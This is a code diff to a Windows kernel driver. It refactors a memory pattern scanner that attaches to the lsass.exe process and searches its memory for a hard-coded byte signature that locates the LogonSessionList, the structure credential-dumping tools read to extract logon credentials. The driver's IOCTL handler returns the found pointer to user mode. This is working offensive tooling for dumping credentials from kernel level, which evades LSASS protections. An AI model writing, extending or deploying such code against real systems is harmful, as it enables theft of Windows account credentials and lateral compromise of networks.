@@ -104,7 +104,9 @@ namespace driver {
 		SIZE_T sReturn_size;
 		PVOID pBase;
 		PVOID pEnd;
-		ULONG_PTR offset;
+		//ULONG_PTR offset;
+		PVOID pattern;
+
 	};
 	//3 functinos for uDriverOBject event handleing.
 
@@ -132,7 +134,7 @@ namespace driver {
 	}
 
 	// Scan memory from pBase to pEnd in chunks for the pattern
-	ULONG_PTR patternScanner(PVOID pBase, PVOID pEnd) {
+	PVOID patternScanner(PVOID pBase, PVOID pEnd) {
 		UCHAR pattern[12] = {0x33,0xFF,0x41,0x89,0x37,0x4C,0x8B,0xF3,0x45,0x85,0xC0,0x74};
 		const size_t patternLength = sizeof(pattern);
 
@@ -162,7 +164,7 @@ namespace driver {
 						DbgPrint("Win1803 Location: 0x%p\n", (PVOID)address);
 						DbgPrint("Offset Location: 0x%llu\n", (unsigned long long)offset);
 
-						return address; // pattern found
+						return (PVOID)address; // pattern found
 					}
 				}
 			}
@@ -175,7 +177,7 @@ namespace driver {
 			KeShouldYieldProcessor(); // Yield CPU to avoid watchdog timeout
 		}
 
-		return 0; // pattern not found
+		return (PVOID)0; // pattern not found
 	}
 
 
@@ -255,7 +257,7 @@ namespace driver {
 			
 			debug_printer("Setting passive...\n");
 			if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
-				request->offset = 0;
+				request->pattern = 0;
 				status = STATUS_INVALID_DEVICE_STATE;
 				break;
 			}
@@ -273,23 +275,23 @@ namespace driver {
 				_try{
 					_try{
 						//now that we're attached all reference in memory go through lsass.exe
-						ULONG_PTR pLogonSessionListOffset = patternScanner(request->pBase, request->pEnd);
+						PVOID pLogonSessionList = patternScanner(request->pBase, request->pEnd);
 						debug_printer("Done searching for pattern...\n");
 
-						if (pLogonSessionListOffset != NULL) {
-							request->offset = pLogonSessionListOffset;
+						if (pLogonSessionList != NULL) {
+							request->pattern = pLogonSessionList;
 							debug_printer("Found lsl offset???!!!! <-----\n...");
-							DbgPrint("Pointer (from try) : 0x%p", (PVOID)pLogonSessionListOffset);
+							DbgPrint("Pointer (from try) : 0x%p\n", pLogonSessionList);
 
 							status = STATUS_SUCCESS;
 						}
 						else {
 							debug_printer("lsl offset not found... :( \n...");
-							request->offset = 0;
+							request->pattern = NULL;
 						}
 					}
 					_except(EXCEPTION_EXECUTE_HANDLER) {
-						request->offset = 0;
+						request->pattern = NULL;
 					}
 				}
 				_finally{
@@ -316,7 +318,7 @@ namespace driver {
 		}
 
 		irp->IoStatus.Status = status;
-		irp->IoStatus.Information = sizeof(request);
+		irp->IoStatus.Information = sizeof(Request); //THIS NMEEDS TO BE THE WHOLE STRUCT!!!! NOT just req
 		IoCompleteRequest(irp, IO_NO_INCREMENT); //every time we complete an IRP / complete incoming packet request, we must call this.
 		//if theres a null ptr computer blue screens..
 		return status; //OS/User can both see what status is when these handlers are called.
